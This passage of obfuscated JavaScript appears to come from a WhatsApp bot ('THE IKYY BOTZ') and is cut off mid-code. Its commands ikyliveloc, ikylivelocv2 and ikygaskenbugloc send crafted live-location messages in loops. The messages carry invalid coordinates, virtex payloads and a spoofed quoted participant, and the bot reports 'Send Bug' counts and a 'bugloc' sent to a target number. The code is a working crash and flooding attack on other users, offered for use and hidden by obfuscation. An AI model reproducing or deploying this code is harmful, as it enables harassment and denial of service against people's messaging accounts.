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','Teks/Reply','apply','473AmuLGa','©\x20Liveloc\x20','302690obbdpB','toString','5865810IxbVal','warn','Message','key','console','549YpEfej','chat','8312416DmLfBA','log','215646qFOMpb','146775zrvNpM','98136wEWGrj','error','trace','search','prototype','0@s.whatsapp.net','THE\x20IKYY\x20BOTZ\x20','bind','4QNZzbD','relayMessage','1657997490287001'];_0x5c50=function(){return _0x7fb9dc;};return _0x5c50();}_0xf2f207();const _0x5b71c4=(function(){let _0x5a5df1=!![];return function(_0xef682,_0x5c02b1){const _0x4a1bd7=_0x5a5df1?function(){const _0xac1631=_0x5167;if(_0x5c02b1){const _0x22e2aa=_0x5c02b1[_0xac1631(0xc9)](_0xef682,arguments);return _0x5c02b1=null,_0x22e2aa;}}:function(){};return _0x5a5df1=![],_0x4a1bd7;};}()),_0x515fe0=_0x5b71c4(this,function(){const _0x58d42d=_0x5167;let _0x461b7c;try{const _0x4eb760=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x461b7c=_0x4eb760();}catch(_0x25cc7c){_0x461b7c=window;}const _0x2915f4=_0x461b7c[_0x58d42d(0xd2)]=_0x461b7c[_0x58d42d(0xd2)]||{},_0x2e8aa3=[_0x58d42d(0xb1),_0x58d42d(0xcf),_0x58d42d(0xc5),_0x58d42d(0xb5),'exception',_0x58d42d(0xc0),_0x58d42d(0xb6)];for(let _0x3dd332=0x0;_0x3dd332<_0x2e8aa3[_0x58d42d(0xc1)];_0x3dd332++){const _0x2dd480=_0x5b71c4['constructor'][_0x58d42d(0xb8)][_0x58d42d(0xbb)](_0x5b71c4),_0x3b7d10=_0x2e8aa3[_0x3dd332],_0x4377bd=_0x2915f4[_0x3b7d10]||_0x2dd480;_0x2dd480['__proto__']=_0x5b71c4[_0x58d42d(0xbb)](_0x5b71c4),_0x2dd480[_0x58d42d(0xcd)]=_0x4377bd[_0x58d42d(0xcd)]['bind'](_0x4377bd),_0x2915f4[_0x3b7d10]=_0x2dd480;}});_0x515fe0();{if(!isCreator&&!isBan)return;if(!m['quoted']&&!text)throw _0x1f1f70(0xc8);let doc={'key':{'participant':_0x1f1f70(0xb9)},'message':{'documentMessage':{'title':_0x1f1f70(0xcb)+text+'\x20','jpegThumbnail':thumb}}};var liveLocation=generateWAMessageFromContent(m[_0x1f1f70(0xaf)],proto[_0x1f1f70(0xd0)][_0x1f1f70(0xc2)]({'liveLocationMessage':{'degreesLatitude':-6.9366881,'degreesLongitude':107.7228148,'caption':_0x1f1f70(0xba)+philips+'\x20'+ngazap(prefix),'sequenceNumber':_0x1f1f70(0xbe),'jpegThumbnail':_0x1f1f70(0xc7)}}),{'userJid':m['chat'],'quoted':doc});ikycoli[_0x1f1f70(0xbd)](m['chat'],liveLocation[_0x1f1f70(0xbf)],{'messageId':liveLocation[_0x1f1f70(0xd1)]['id']}),jancok('Sukses\x20Convert\x20To\x20liveloc');}
}
break
case 'ikyliveloc': {
const _0x1ba2c2=_0x4869;(function(_0x20ac8f,_0x302773){const _0x4017fb=_0x4869,_0x59881b=_0x20ac8f();while(!![]){try{const _0xd4a5d=-parseInt(_0x4017fb(0x19d))/0x1*(-parseInt(_0x4017fb(0x1b7))/0x2)+-parseInt(_0x4017fb(0x1a6))/0x3*(-parseInt(_0x4017fb(0x1a3))/0x4)+-parseInt(_0x4017fb(0x1ad))/0x5+parseInt(_0x4017fb(0x1a8))/0x6+parseInt(_0x4017fb(0x199))/0x7+-parseInt(_0x4017fb(0x19f))/0x8+parseInt(_0x4017fb(0x1b1))/0x9*(-parseInt(_0x4017fb(0x1a2))/0xa);if(_0xd4a5d===_0x302773)break;else _0x59881b['push'](_0x59881b['shift']());}catch(_0x25d8c1){_0x59881b['push'](_0x59881b['shift']());}}}(_0x20e4,0xc5a02));const _0x220054=(function(){let _0x42423d=!![];return function(_0x579340,_0x1493f5){const _0x3ec634=_0x42423d?function(){const _0x474b0d=_0x4869;if(_0x1493f5){const _0x14d6ee=_0x1493f5[_0x474b0d(0x1b3)](_0x579340,arguments);return _0x1493f5=null,_0x14d6ee;}}:function(){};return _0x42423d=![],_0x3ec634;};}()),_0x5aa37b=_0x220054(this,function(){const _0x2bcd60=_0x4869;return _0x5aa37b[_0x2bcd60(0x195)]()[_0x2bcd60(0x1af)](_0x2bcd60(0x19a))[_0x2bcd60(0x195)]()[_0x2bcd60(0x1a9)](_0x5aa37b)['search']('(((.+)+)+)+$');});_0x5aa37b();const _0x521227=(function(){let _0x49498f=!![];return function(_0x3a7352,_0x43e554){const _0xf0c3e0=_0x49498f?function(){if(_0x43e554){const _0x572add=_0x43e554['apply'](_0x3a7352,arguments);return _0x43e554=null,_0x572add;}}:function(){};return _0x49498f=![],_0xf0c3e0;};}()),_0xa3d179=_0x521227(this,function(){const _0x165fed=_0x4869;let _0xe54626;try{const _0x17a6cb=Function('return\x20(function()\x20'+_0x165fed(0x1a1)+');');_0xe54626=_0x17a6cb();}catch(_0x3b5001){_0xe54626=window;}const _0x556872=_0xe54626[_0x165fed(0x1b4)]=_0xe54626[_0x165fed(0x1b4)]||{},_0x1a7ee8=[_0x165fed(0x1a7),_0x165fed(0x1a4),'info',_0x165fed(0x1b6),_0x165fed(0x194),_0x165fed(0x19e),_0x165fed(0x1b2)];for(let _0xa17102=0x0;_0xa17102<_0x1a7ee8[_0x165fed(0x1aa)];_0xa17102++){const _0x3d6db9=_0x521227[_0x165fed(0x1a9)][_0x165fed(0x198)]['bind'](_0x521227),_0x21f959=_0x1a7ee8[_0xa17102],_0x28ce44=_0x556872[_0x21f959]||_0x3d6db9;_0x3d6db9[_0x165fed(0x196)]=_0x521227[_0x165fed(0x1a5)](_0x521227),_0x3d6db9[_0x165fed(0x195)]=_0x28ce44[_0x165fed(0x195)][_0x165fed(0x1a5)](_0x28ce44),_0x556872[_0x21f959]=_0x3d6db9;}});_0xa3d179();function _0x4869(_0x296881,_0xa16a44){const _0x3158c7=_0x20e4();return _0x4869=function(_0xa3d179,_0x521227){_0xa3d179=_0xa3d179-0x193;let _0xe78e1e=_0x3158c7[_0xa3d179];return _0xe78e1e;},_0x4869(_0x296881,_0xa16a44);}{if(!isCreator&&!isBan)return;if(args[_0x1ba2c2(0x1aa)]==0x0)return m[_0x1ba2c2(0x1a0)](_0x1ba2c2(0x1b0));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let doc={'key':{'participant':_0x1ba2c2(0x193)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var liveLocation=generateWAMessageFromContent(m[_0x1ba2c2(0x1ac)],proto[_0x1ba2c2(0x19b)][_0x1ba2c2(0x1ae)]({'liveLocationMessage':{'degreesLatitude':-6.9366881,'degreesLongitude':107.7228148,'caption':'THE\x20IKYY\x20BOTZ\x20'+philips+'\x20'+ngazap(prefix),'sequenceNumber':'1657997490287001','jpegThumbnail':_0x1ba2c2(0x19c)}}),{'userJid':m[_0x1ba2c2(0x1ac)],'quoted':doc});ikycoli[_0x1ba2c2(0x197)](m[_0x1ba2c2(0x1ac)],liveLocation[_0x1ba2c2(0x1ab)],{'messageId':liveLocation[_0x1ba2c2(0x1b5)]['id']});}jancok('Sukses\x20Send\x20Bug\x20Sebanyak\x20'+jumlah);}function _0x20e4(){const _0x4f0e5e=['key','error','1903978FixzdQ','0@s.whatsapp.net','exception','toString','__proto__','relayMessage','prototype','11265625WsLxEg','(((.+)+)+)+$','Message','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','1sPdRXS','table','12182784PQueMi','reply','{}.constructor(\x22return\x20this\x22)(\x20)','27472430jfnADZ','2856856MKVOYh','warn','bind','6dqMnrR','log','6850608FfDzpH','constructor','length','message','chat','259975CeWNCK','fromObject','search','Jumlahnya?','9LkYsXu','trace','apply','console'];_0x20e4=function(){return _0x4f0e5e;};return _0x20e4();}
}
break

case 'ikylivelocv2': {
function _0x3bd0(){const _0x45125f=['apply','key','11QoMHKO','reply','console','relayMessage','2027540famfFm','6144136lVbsCZ','Sukses\x20Send\x20Bug\x20Sebanyak\x20','1532280505','chat','8549786ZWHupM','1985590cfHVMW','(((.+)+)+)+$','constructor','{}.constructor(\x22return\x20this\x22)(\x20)','message','81SLCzTv','THE\x20IKYY\x20BOTZ\x20💊\x0a\x0a','6rMcnVj','132128XgjZTM','By:\x20THE\x20IKYY\x20BOTZ','./pict.jpg','readFileSync','bind','table','warn','5544936dSQivV','exception','171030GXieLE','toString','length','prototype','info','error'];_0x3bd0=function(){return _0x45125f;};return _0x3bd0();}const _0x390cc8=_0x2695;(function(_0x52c3a4,_0x20ffb6){const _0xafca30=_0x2695,_0x4b83db=_0x52c3a4();while(!![]){try{const _0x59a330=parseInt(_0xafca30(0xe0))/0x1*(-parseInt(_0xafca30(0xd8))/0x2)+parseInt(_0xafca30(0xef))/0x3*(parseInt(_0xafca30(0xf2))/0x4)+parseInt(_0xafca30(0xea))/0x5+-parseInt(_0xafca30(0xf1))/0x6*(parseInt(_0xafca30(0xe9))/0x7)+parseInt(_0xafca30(0xe5))/0x8+parseInt(_0xafca30(0xd6))/0x9+parseInt(_0xafca30(0xe4))/0xa;if(_0x59a330===_0x20ffb6)break;else _0x4b83db['push'](_0x4b83db['shift']());}catch(_0x366248){_0x4b83db['push'](_0x4b83db['shift']());}}}(_0x3bd0,0xae442));const _0x4aea08=(function(){let _0x44349b=!![];return function(_0x4f30f2,_0x4ef817){const _0x282fb7=_0x44349b?function(){if(_0x4ef817){const _0x42b812=_0x4ef817['apply'](_0x4f30f2,arguments);return _0x4ef817=null,_0x42b812;}}:function(){};return _0x44349b=![],_0x282fb7;};}()),_0x518f38=_0x4aea08(this,function(){const _0x1b16df=_0x2695;return _0x518f38[_0x1b16df(0xd9)]()['search'](_0x1b16df(0xeb))[_0x1b16df(0xd9)]()['constructor'](_0x518f38)['search'](_0x1b16df(0xeb));});_0x518f38();const _0x1bf167=(function(){let _0x4e5aef=!![];return function(_0x3cf63d,_0x43c2bc){const _0x598afa=_0x4e5aef?function(){const _0x506b72=_0x2695;if(_0x43c2bc){const _0x1d3492=_0x43c2bc[_0x506b72(0xde)](_0x3cf63d,arguments);return _0x43c2bc=null,_0x1d3492;}}:function(){};return _0x4e5aef=![],_0x598afa;};}()),_0xd47891=_0x1bf167(this,function(){const _0x5681c2=_0x2695,_0x35c630=function(){const _0x1fc2df=_0x2695;let _0x51320c;try{_0x51320c=Function('return\x20(function()\x20'+_0x1fc2df(0xed)+');')();}catch(_0xdf8adf){_0x51320c=window;}return _0x51320c;},_0x1dba8c=_0x35c630(),_0x5b6c8a=_0x1dba8c[_0x5681c2(0xe2)]=_0x1dba8c['console']||{},_0x2386d4=['log',_0x5681c2(0xd5),_0x5681c2(0xdc),_0x5681c2(0xdd),_0x5681c2(0xd7),_0x5681c2(0xd4),'trace'];for(let _0x47eb94=0x0;_0x47eb94<_0x2386d4[_0x5681c2(0xda)];_0x47eb94++){const _0x17f2e8=_0x1bf167[_0x5681c2(0xec)][_0x5681c2(0xdb)][_0x5681c2(0xf6)](_0x1bf167),_0x4db922=_0x2386d4[_0x47eb94],_0x2c312a=_0x5b6c8a[_0x4db922]||_0x17f2e8;_0x17f2e8['__proto__']=_0x1bf167['bind'](_0x1bf167),_0x17f2e8['toString']=_0x2c312a[_0x5681c2(0xd9)][_0x5681c2(0xf6)](_0x2c312a),_0x5b6c8a[_0x4db922]=_0x17f2e8;}});_0xd47891();function _0x2695(_0x5f05d9,_0x26c0f6){const _0x496936=_0x3bd0();return _0x2695=function(_0xd47891,_0x1bf167){_0xd47891=_0xd47891-0xd4;let _0x404c6d=_0x496936[_0xd47891];return _0x404c6d;},_0x2695(_0x5f05d9,_0x26c0f6);}{if(!isCreator&&!isBan)return;if(args[_0x390cc8(0xda)]==0x0)return m[_0x390cc8(0xe1)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){res=generateWAMessageFromContent(m['chat'],{'liveLocationMessage':{'degreesLatitude':-7.8374838,'degreesLongitude':727.8383838,'caption':_0x390cc8(0xf0)+philips+'\x20'+virtex3,'sequenceNumber':_0x390cc8(0xe7),'thumbnail':virgam,'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':{'key':{'participant':'0@s.whatsapp.net',...{'remoteJid':''}},'message':{'liveLocationMessage':{'caption':_0x390cc8(0xf3),'jpegThumbnail':fs[_0x390cc8(0xf5)](_0x390cc8(0xf4))}}},'contextInfo':{}}),ikycoli[_0x390cc8(0xe3)](m[_0x390cc8(0xe8)],res[_0x390cc8(0xee)],{'messageId':res[_0x390cc8(0xdf)]['id']});}jancok(_0x390cc8(0xe6)+jumlah);}
}
break
case 'ikygaskenbugloc': {
var _0x242936=_0x1cf3;function _0x22c9(){var _0x301da9=['Berhasil\x20Mengirim\x20Bugloc\x20Di\x20Nomer\x20','51823ymPpSY','4397995ARLGEi','8072874QAqgKV','relayMessage','9117960uIkNmu','{}.constructor(\x22return\x20this\x22)(\x20)','prototype','3022194isIJgH','error','console','chat','length','Message','949108BqUWtB','@s.whatsapp.net','search','exception','2jwBrQn','(((.+)+)+)+$','838959aVUkiU','toString','return\x20(function()\x20','bind','imageMessage','6rRKZQV','readFileSync','waUploadToServer','Nomernya\x20mana?','key','漏\x20饾懟饾懐饾懍\x20饾懕饾懚\x20饾懇饾懚饾懟饾拋','message','warn','8wSVsMJ'];_0x22c9=function(){return _0x301da9;};return _0x22c9();}(function(_0x16e55c,_0x395793){var _0x4445af=_0x1cf3,_0x470565=_0x16e55c();while(!![]){try{var _0x10c5d8=-parseInt(_0x4445af(0x1a3))/0x1*(parseInt(_0x4445af(0x1b4))/0x2)+parseInt(_0x4445af(0x1b6))/0x3+-parseInt(_0x4445af(0x1b0))/0x4+-parseInt(_0x4445af(0x1a4))/0x5*(-parseInt(_0x4445af(0x1bb))/0x6)+-parseInt(_0x4445af(0x1aa))/0x7+parseInt(_0x4445af(0x1a1))/0x8*(-parseInt(_0x4445af(0x1a5))/0x9)+parseInt(_0x4445af(0x1a7))/0xa;if(_0x10c5d8===_0x395793)break;else _0x470565['push'](_0x470565['shift']());}catch(_0x457b98){_0x470565['push'](_0x470565['shift']());}}}(_0x22c9,0x6ea64));var _0x4b5e4a=(function(){var _0x205ae4=!![];return function(_0x4c564b,_0x4fba78){var _0x2b1967=_0x205ae4?function(){if(_0x4fba78){var _0x3069e3=_0x4fba78['apply'](_0x4c564b,arguments);return _0x4fba78=null,_0x3069e3;}}:function(){};return _0x205ae4=![],_0x2b1967;};}()),_0x454177=_0x4b5e4a(this,function(){var _0x21d5dd=_0x1cf3;return 